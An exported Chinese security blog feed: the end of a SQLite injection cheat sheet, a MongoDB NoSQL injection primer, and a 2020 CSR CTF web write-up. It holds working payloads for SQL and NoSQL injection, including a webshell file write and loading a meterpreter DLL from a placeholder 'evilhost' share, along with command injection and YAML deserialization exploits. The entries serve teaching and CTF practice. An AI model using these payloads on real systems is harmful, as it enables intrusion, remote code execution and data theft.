<td>abs(case(length(xxx)&amp;{1&lt;&lt;n})when(0)then(0)else(0x8000000000000000)end)</td>
<td>获取长度，需要脚本配合，n：1~16</td>
</tr>
<tr>
<td>基于错误的盲注 3</td>
<td>abs(ifnull(nullif(length((SELECT(flag)from(flag))),$LENGTH$),0x8000000000000000))</td>
<td>获取长度，通过遍历</td>
</tr>
<tr>
<td>生成单引号 1</td>
<td>select cast(X’27’ as text);</td>
<td></td>
</tr>
<tr>
<td>生成单引号 2</td>
<td>select substr(quote(hex(0)),1,1);</td>
<td>quote：返回SQL文字的文本，该文本是其参数的值，适合包含在SQL语句中。字符串由<strong>单引号</strong>包围。</td>
</tr>
<tr>
<td>生成双引号</td>
<td>select cast(X’22’ as text);</td>
<td></td>
</tr>
<tr>
<td>基于时间的盲注</td>
<td>1’ AND [RANDNUM]=LIKE(‘ABCDEFG’, UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</td>
<td>供判断注入，RANDOMBLOB()函数生成指定长度的随机字符串。当这个长度足够大的时候就会让服务器产生明显的延迟。这样就可以判断语句的执行成功与否，这同时也是通用的注入 payload 。实际上，AND 后面的表达式计算出来是 0 。</td>
</tr>
<tr>
<td>布尔盲注 1</td>
<td>and (SELECT count(tbl_name) FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ ) &lt; number_of_table</td>
<td>获得表的个数</td>
</tr>
<tr>
<td>布尔盲注 2</td>
<td>and (SELECT length(tbl_name) FROM sqlite_master WHERE type=’table’ and tbl_name not like ‘sqlite_%’ limit 1 offset 0)=table_name_length_number</td>
<td>列举表名</td>
</tr>
<tr>
<td>布尔盲注 3</td>
<td>and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite_%’ limit 1 offset 0) &gt; hex(‘some_char’)</td>
<td>获得数据</td>
</tr>
<tr>
<td>文件写入</td>
<td>1’;ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘’;—</td>
<td>需要堆叠查询对应配置开启</td>
</tr>
<tr>
<td>代码执行</td>
<td>UNION SELECT 1,load_extension(‘\\evilhost\evilshare\meterpreter.dll’,’DllMain’);—</td>
<td>具体使用可以看上面介绍给出的链接，默认情况下这个函数是禁用的。</td>
</tr>
</tbody>
</table>
</div>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet">https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet</a></p>
<p><a href="https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf">https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>SQLite注入</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 注入初识</title>
    <url>/archives/15015253.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写此篇缘由 2020 CSR 的 Secure Secret Sharing 这道 MongoDB 注入题，发现其注入方式完全不同于 MySQL、SQLite 等数据库，同时国内关于 MongoDB 注入的文章很少，且发表于 2012~2016 很早的时间段，所以想结合外网的文章进行翻译拓展，由于参考文章非常多，就不详细列出了，一些也需要科学上网才能访问。</p>
<p>总之，希望这篇文章能帮助到你。</p>
<a id="more"></a>
<h1 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h1><p>MongoDB 安装可以参考这篇<a href="https://blog.csdn.net/weixin_41466575/article/details/105326230">博客</a> ，当然你要是有 docker 则更为方便。</p>
<p>基础语法的学习建议先去看看 <a href="https://docs.mongoing.com/mongo-introduction">MongoDB 官方中文手册</a> ，本篇并不作介绍。</p>
<h2 id="注入简介"><a href="#注入简介" class="headerlink" title="注入简介"></a>注入简介</h2><p>MongoDB 是 NoSQL 的一个开源数据库，它的“数据”是一个文档，由字段和值对组成的数据结构，类似于JSON对象。字段的值可以包括其他文档，数组和文档数组。而它的“表”则称为集合。</p>
<p>我们知道 SQL 注入是允许攻击者在数据库中执行命令。但与关系数据库不同，NoSQL 数据库<strong>不使用通用查询语言</strong>。NoSQL 查询语法是用应用程序的编程语言编写的 : PHP、 JavaScript、 Python、 Java 等等，这也意味着成功的注入使攻击者不仅可以在数据库中执行命令，而且还可以在应用程序本身中执行命令，变得更加危险。</p>
<p>而 MongoDB 使用二进制 JSON (BSON) 数据格式，并附带一个安全的 BSON 查询汇编工具。查询也表示为 BSON 对象 (即二进制数据) ，因此<strong>不可能进行直接字符串注入</strong>，如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123;username: username, password: password&#125;);</span><br></pre></td></tr></table></figure>
<p>以这种形式来查询用户登录信息的语句。</p>
<p>但我们看下面的例子：</p>
<h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>假设用户名字段或参数来自反序列化的 JSON 对象。</p>
<p>源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        db.users.find(&#123;<span class="attr">username</span>: req.body.username, <span class="attr">password</span>: req.body.password&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, users</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> handle the rest</span></span><br><span class="line">        &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在上面的 ExpressJS 程序中，没有验证用户名和密码字段以确保它们是字符串。因此，当对 JSON 文档进行反序列化时，这些字段可能包含除字符串以外的任何字符串，而这些字符串可用于操作查询的结构。</p>
<p>如果一个人提供这样一个 JSON 文档作为应用程序的输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &#123;&quot;$gt&quot;: &quot;&quot;&#125;,</span><br><span class="line">    &quot;password&quot;: &#123;&quot;$gt&quot;: &quot;&quot;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们知道 <code>$gt</code> 是大于运算符，那么数据库将把用户名和密码与 “” 进行比较，大于空，不就是<strong>恒真</strong>吗？</p>
<p>更为明显的示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">queryObject = &#123;<span class="attr">amount</span>:<span class="number">0</span>&#125;; <span class="comment">//items with fixed value ‘amount’ is 0</span></span><br><span class="line"><span class="comment">// inject $gt:0</span></span><br><span class="line">queryObject = &#123;<span class="attr">amount</span>: &#123;<span class="attr">$gt</span>:<span class="number">0</span>&#125;&#125;; <span class="comment">//items with field amount &gt;0</span></span><br></pre></td></tr></table></figure>
<p>如上，我们将获得所有 amout 大于 0 的文档。</p>
<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>上面将 JSON 作为通信机制的例子并不少见，但更为广泛运用的是 url 编码的键值对，但用这个格式就安全了吗？</p>
<p>遗憾的是，下面的输入可以与上面达到一样的效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[$gt]&#x3D;&amp;password[$gt]&#x3D;</span><br></pre></td></tr></table></figure>
<p>字符串用户名 <code>[$gt]=</code> 是 qs 模块使用的一种特殊语法 (ExpressJS 和 body-parser 中间件中的默认语法)。这种语法相当于使用一个名为 <code>$gt</code> 的参数创建一个 JavaScript 对象/散列，该参数被映射为 no value 。从本质上讲，上面的请求会产生一个 JavaScript 对象，如下面所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &#123;&quot;$gt&quot;: undefined&#125;,</span><br><span class="line">    &quot;password&quot;: &#123;&quot;$gt&quot;: undefined&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="注入详解"><a href="#注入详解" class="headerlink" title="注入详解"></a>注入详解</h2><h3 id="Payload-构造"><a href="#Payload-构造" class="headerlink" title="Payload 构造"></a>Payload 构造</h3><p>在上面的讲述中我们用到了 <code>$gt</code> 这个运算符构造恒真，而 MongoDB 还有其他很多运算符可供使用，我们通过这些结合示例来学习如何构造 payload ：</p>
<blockquote>
<p><code>$ne</code> — 匹配所有不等于指定值的值。</p>
<p><code>$gt</code> — 匹配大于指定值的值。</p>
<p><code>$exists</code> — 匹配具有指定字段的文档。</p>
<p>以上三种在 bypass 身份验证时常用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#in URL</span><br><span class="line">username[$ne]&#x3D;xx&amp;password[$ne]&#x3D;xx</span><br><span class="line">username[$exists]&#x3D;true&amp;password[$exists]&#x3D;true</span><br><span class="line"></span><br><span class="line">#in JSON</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: &quot;foo&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: &quot;bar&quot;&#125; &#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$gt&quot;: undefined&#125;, &quot;password&quot;: &#123;&quot;$gt&quot;: undefined&#125; &#125;</span><br></pre></td></tr></table></figure>
<p><code>$regex</code> — 选择值与指定的正则表达式匹配的文档。</p>
<p>通常用于盲注。</p>
<p>基于 <code>$regex</code> 的盲注，如果可以科学上网的强烈建议看一下<a href="https://medium.com/rangeforce/meteor-blind-nosql-injection-29211775cd01">这篇文章</a></p>
<p>Python 脚本相信懂了下面示例的你一定能写出来:-)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[$regex]&#x3D;^adm$password[$ne]&#x3D;1 </span><br><span class="line">#Check a &lt;regular expression&gt;, could be used to brute-force a parameter</span><br><span class="line">username[$regex]&#x3D;.&#123;25&#125;&amp;pass[$ne]&#x3D;1 </span><br><span class="line">#Use the &lt;regex&gt; to find the length of a value</span><br></pre></td></tr></table></figure>
<p><code>$nin</code> — 不匹配数组中指定的任何值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[$nin][admin]&#x3D;admin&amp;username[$nin][test]&#x3D;test&amp;pass[$ne]&#x3D;7 </span><br><span class="line">#&lt;Matches non of the values of the array&gt; (not test and not admin)</span><br></pre></td></tr></table></figure>
<p><code>$where</code> — 匹配满足JavaScript表达式的文档。</p>
<p>被允许运行 JavaScript 的还有 <code>mapReduce</code>、<code>group</code> :</p>
<p><img src="https://i.loli.net/2020/11/10/FdDJpWCmQqOs2jB.png"  /></p>
<p>文档非常清楚，如果使用了这个功能，开发者应该注意防止用户提交恶意的 JavaScript 。换句话说，MongoDB 特意包含了一个潜在的注入向量。</p>
<p>例如，使用 <code>$where</code> 查询通常会用到 <code>find()</code> 函数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.collection.find( &#123; <span class="attr">$where</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line"> <span class="keyword">return</span> (<span class="built_in">this</span>.name == $userData) &#125; &#125; );</span><br><span class="line"><span class="comment">//inject &#x27;a&#x27;;sleep(5000)</span></span><br><span class="line">db.collection.find( &#123; <span class="attr">$where</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line"> <span class="keyword">return</span> (<span class="built_in">this</span>.name == <span class="string">&#x27;a&#x27;</span>; sleep(<span class="number">5000</span>) ) &#125; &#125; );</span><br></pre></td></tr></table></figure>
<p>如果上面注入成功，服务器将会停顿 5 s 。</p>
</blockquote>
<p>更多 payload 的学习，可以参考一下这个<a href="https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt">文档</a></p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>NoSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 CSR CTF Web 部分复盘</title>
    <url>/archives/672c7ef3.html</url>
    <content><![CDATA[<div class="note info">
            <p>本文由<strong>landvsec</strong>原创发布</p><p>来源于合天智汇公众号 <a href="https://mp.weixin.qq.com/s/ICMlGC9ZZMStfRLF0Yl4xg">2020-CSR-CTF-Web-复盘以及分析 (qq.com)</a></p>
          </div>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>合天投稿成功的第一篇文章，迟了足足半月发布，想想也是最后一篇文章了 :-)</p>
<p>2020 年 10 月 31 日万圣节举办的德国比赛，界面很有特色，web 题目质量很高，结束后通通复盘了一遍深入理解。题目从易到难一共有十道，其中九道有出，本篇只详细分析解数多的五道。</p>
<p>本篇相关亮点：</p>
<ul>
<li>Python yaml 反序列化</li>
<li>Node.JS RCE</li>
<li>NoSQL 盲注</li>
</ul>
<a id="more"></a>
<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="Cyberwall"><a href="#Cyberwall" class="headerlink" title="Cyberwall"></a>Cyberwall</h2><p>开胃小菜。</p>
<p>网页源码有密码可登入。</p>
<p>路由 debug 命令注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|ls</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/08/JIvW62ukw5maPjz.png" style="zoom:80%;" /></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|cat super_secret_data.txt</span><br></pre></td></tr></table></figure>
<h2 id="Wheels-n-Whales"><a href="#Wheels-n-Whales" class="headerlink" title="Wheels n Whales"></a>Wheels n Whales</h2><p>给了源码</p>
<p>web.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect, Flask, render_template, request, abort</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, send_from_directory, make_response, Response</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">EASTER_WHALE = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;TheBestWhaleIsAWhaleEveryOneLikes&quot;</span>, <span class="string">&quot;image_num&quot;</span>: <span class="number">2</span>, <span class="string">&quot;weight&quot;</span>: <span class="number">34</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html.jinja&quot;</span>, active=<span class="string">&quot;home&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Whale</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, image_num, weight</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.image_num = image_num</span><br><span class="line">        self.weight = weight</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> yaml.dump(self.__dict__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/whale&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whale</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        name = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">        <span class="comment"># 长度限制 10</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">10</span>: </span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;Name to long. Whales can only understand names up to 10 chars&quot;</span>, <span class="number">400</span>)</span><br><span class="line">        image_num = request.form[<span class="string">&quot;image_num&quot;</span>]</span><br><span class="line">        weight = request.form[<span class="string">&quot;weight&quot;</span>]</span><br><span class="line">        whale = Whale(name, image_num, weight)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># getflag 注意这里</span></span><br><span class="line">        <span class="keyword">if</span> whale.__dict__ == EASTER_WHALE:</span><br><span class="line">            <span class="keyword">return</span> make_response(flag.get_flag(), <span class="number">200</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;whale.html.jinja&quot;</span>, w=whale, active=<span class="string">&quot;whale&quot;</span>), <span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;whale_builder.html.jinja&quot;</span>, active=<span class="string">&quot;whale&quot;</span>), <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wheel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, image_num, diameter</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.image_num = image_num</span><br><span class="line">        self.diameter = diameter</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_configuration</span>(<span class="params">config</span>):</span></span><br><span class="line">        <span class="keyword">return</span> Wheel(**yaml.load(config, Loader=yaml.Loader))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> yaml.dump(self.__dict__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/wheel&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wheel</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;config&quot;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">            wheel = Wheel.from_configuration(request.form[<span class="string">&quot;config&quot;</span>])</span><br><span class="line">            <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;wheel.html.jinja&quot;</span>, w=wheel, active=<span class="string">&quot;wheel&quot;</span>), <span class="number">200</span>)</span><br><span class="line">        name = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">        image_num = request.form[<span class="string">&quot;image_num&quot;</span>]</span><br><span class="line">        diameter = request.form[<span class="string">&quot;diameter&quot;</span>]</span><br><span class="line">        wheel = Wheel(name, image_num, diameter)</span><br><span class="line">        print(wheel.dump())</span><br><span class="line">        <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;wheel.html.jinja&quot;</span>, w=wheel, active=<span class="string">&quot;wheel&quot;</span>), <span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;wheel_builder.html.jinja&quot;</span>, active=<span class="string">&quot;wheel&quot;</span>), <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>flask 框架，yaml 序列化。</p>
<p>整体逻辑很简单，wheel 和 whale 两个类，whale 需要我们创建属性值与 <code>EASTER_WHALE</code> 相同的类对象，但 name 属性明显过不了 if ，长度限制 10 。</p>
<p>wheel 就没有这么多限制，而且我们注意到，除了用构造函数创建 wheel 实例外，还有这段：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wheel</span>:</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_configuration</span>(<span class="params">config</span>):</span></span><br><span class="line">        <span class="keyword">return</span> Wheel(**yaml.load(config, Loader=yaml.Loader))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> yaml.dump(self.__dict__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/wheel&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wheel</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;config&quot;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">            wheel = Wheel.from_configuration(request.form[<span class="string">&quot;config&quot;</span>])</span><br><span class="line">            <span class="keyword">return</span> make_response(render_template(<span class="string">&quot;wheel.html.jinja&quot;</span>, w=wheel, active=<span class="string">&quot;wheel&quot;</span>), <span class="number">200</span>)</span><br></pre></td></tr></table></figure>
<p>我们结合 <a href="https://pyyaml.org/wiki/PyYAMLDocumentation">Pyyaml 官方文档</a> 来理解一下上述代码做了什么，有何利用点：</p>
<blockquote>
<p><code>yaml.dump(data, Dumper=Dumper)</code></p>
<p><code>yaml.dump</code> 函数接受一个 Python 对象并生成一个 YAML 文档。</p>
<p><code>yaml.load(stream, Loader=Loader)</code></p>
<p><code>yaml.load</code> 函数将 YAML 文档转换为 Python 对象，返回一个 Python 对象。</p>
<p><code>yaml.load</code> 接受一个字节字符串、一个 Unicode 字符串、一个打开的二进制文件对象或一个打开的文本文件对象。字节字符串或文件必须使用 utf-8、 utf-16-be 或 utf-16-le 编码进行编码。<code>yaml.load</code> 通过检查字符串/文件开头的 BOM (字节顺序标记) 序列来检测编码。如果没有提供 BOM，则假定采用 utf-8编码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>yaml.load(<span class="string">u&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>hello: Привет!</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&quot;&quot;&quot;</span>)    <span class="comment"># In Python 3, do not use the &#x27;u&#x27; prefix</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;hello&#x27;</span>: <span class="string">u&#x27;\u041f\u0440\u0438\u0432\u0435\u0442!&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stream = file(<span class="string">&#x27;document.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)    <span class="comment"># &#x27;document.yaml&#x27; contains a single YAML document.</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>yaml.load(stream)</span><br><span class="line">[...]    <span class="comment"># A Python object corresponding to the document.</span></span><br></pre></td></tr></table></figure>
<p>对于这个函数，官方也有警告：</p>
<p>用从不可信来源接收的任何数据调用 <code>yaml.load</code> 是不安全的！<code>yaml.load</code> 和 <code>pickle.load</code> 一样强大，因此<strong>可以调用任何 Python 函数</strong>。</p>
<p>既然 <code>yaml.load</code> 可以调用任何 Python 函数，那我们可以不用想办法创建 whale 去使之与 <code>EASTER_WHALE</code> 相等，直接 <code>flag.get_flag()</code> 即可。</p>
<p>结合题目代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_configuration</span>(<span class="params">config</span>):</span></span><br><span class="line">  <span class="keyword">return</span> Wheel(**yaml.load(config, Loader=yaml.Loader))</span><br></pre></td></tr></table></figure>
<p>这里的 <code>yaml.load</code> 从 config 中读取 yaml 文件创建 wheel 对象，加上 <code>Loader=yaml.Loader</code> 只是为了避免警告。</p>
<p>而 config 则是来自我们 post 的表单数据：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;config&quot;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">      wheel = Wheel.from_configuration(request.form[<span class="string">&quot;config&quot;</span>])</span><br></pre></td></tr></table></figure>
<p>到这里思路就很明晰了，我们从路由 wheel post config 对象，config 的 name 用我们精心构造的可以 <code>flag.get_flag()</code> 的语句，其他参数因为是数字类型所以随便写即可。</p>
</blockquote>
<p>我们先要想办法序列化一个对象传入 <code>yaml.load</code> ，而对应官方文档有：</p>
<blockquote>
<p><code>!!python/object:module.Class &#123; attribute: value, ... &#125;</code></p>
<p>任何可选对象都可以使用 <code>!!python/object</code> 进行序列化。</p>
<p>为了支持 pickle 协议，还提供了两种额外形式。</p>
<p><code>!!python/object/new:module.Class [argument, ...]</code></p>
<p><code>!!python/object/apply:module.function [argument, ...]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Hero</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, hp, sp</span>):</span></span><br><span class="line"><span class="meta">... </span>        self.name = name</span><br><span class="line"><span class="meta">... </span>        self.hp = hp</span><br><span class="line"><span class="meta">... </span>        self.sp = sp</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> <span class="string">&quot;%s(name=%r, hp=%r, sp=%r)&quot;</span> % (</span><br><span class="line"><span class="meta">... </span>            self.__class__.__name__, self.name, self.hp, self.sp)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>!!python/object:__main__.Hero</span></span><br><span class="line"><span class="string"><span class="meta">... </span>name: Welthyr Syxgon</span></span><br><span class="line"><span class="string"><span class="meta">... </span>hp: 1200</span></span><br><span class="line"><span class="string"><span class="meta">... </span>sp: 0</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">Hero(name=<span class="string">&#x27;Welthyr Syxgon&#x27;</span>, hp=<span class="number">1200</span>, sp=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>如上例，Hero 类有三个属性 name、hp、sp ，我们可以通过 <code>!!python/object</code> 利用 <code>yaml.load</code> 成功序列化出来。</p>
</blockquote>
<p>所以我们可以构造 payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config&#x3D;&#123;name: !!python&#x2F;object&#x2F;apply:flag.get_flag [], image_num: 3, diameter: 3&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/11/04/ZBT2En89GYMr3xL.png"  /></p>
<h2 id="CSRegex"><a href="#CSRegex" class="headerlink" title="CSRegex"></a>CSRegex</h2><p>页面是正则表达式测试工具。</p>
<p>nodejs 笔者没有相关开发经验，写的可能有所欠缺，所以下文仅作为参考。</p>
<p><img src="https://i.loli.net/2020/11/05/57HmRA2rOlEtdZX.png" style="zoom: 67%;" /></p>
<p>我们应首先判断这个网站是用什么写的，当然 ctf 首先想到的是 node ，这种类似的题在 picoCTF见过，这里摆出来只是为了介绍一下，判断 node 简便的方法有两种：</p>
<ul>
<li>当访问一个不存在的路径时，会得到 node 错误 “ Can not GET/whatever” ，响应头部有 <code>X-Powered-By: Express</code> （ Express 框架开发）</li>
<li>利用 <code>Wappalyzer</code> 之类的插件了解网站所用技术</li>
</ul>
<p>但明显不能用到这里：</p>
<p><img src="https://i.loli.net/2020/11/05/ApzDUV5GKyWorPk.png" style="zoom:80%;" /></p>
<p>作为第二种方式的代替，我比赛时找到了 <a href="https://builtwith.com/">https://builtwith.com/</a></p>
<p>发现了 underscore.js ，nodejs 库。</p>
<p>同时 <a href="https://github.com/tHoMaStHeThErMoNuClEaRbOmB/ctfwriteups/blob/master/CyberSecurityRumblectf/web/CSRegex/README.md#solution">国外师傅</a> 是利用 <code>fetch</code> 是否定义来判断该网站是运行在 node 上还是浏览器上的：</p>
<blockquote>
<p>“fetch is not defined” — we are running on node and not a web browser</p>
</blockquote>
<p>通过观察 JavaScript Code ，我们可以先闭合掉前面的正则表达式，试着拼接一些命令来获取更多信息，最后再注释掉：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line">\w/gi);<span class="keyword">let</span> a=<span class="number">10</span>;<span class="keyword">return</span> a;/</span><br><span class="line">------</span><br><span class="line"><span class="string">&#x27;123&#x27;</span>.match(<span class="regexp">/\w/gi</span>);<span class="keyword">let</span> a=<span class="number">10</span>;<span class="keyword">return</span> a;<span class="comment">//gi)</span></span><br><span class="line">------</span><br><span class="line">&#123; <span class="string">&quot;result&quot;</span>: <span class="number">10</span> &#125;</span><br></pre></td></tr></table></figure>
<p>既然有了 RCE ，我们先来考虑读系统文件该怎么构造 payload ，node 有 fs 模块用于对系统文件及目录进行读写操作，需要用 <code>require(&#39;fs&#39;)</code> 来载入，但<strong>上下文</strong>里不一定有 <code>require</code> ，<code>require</code> 并不是可以全局访问的。</p>
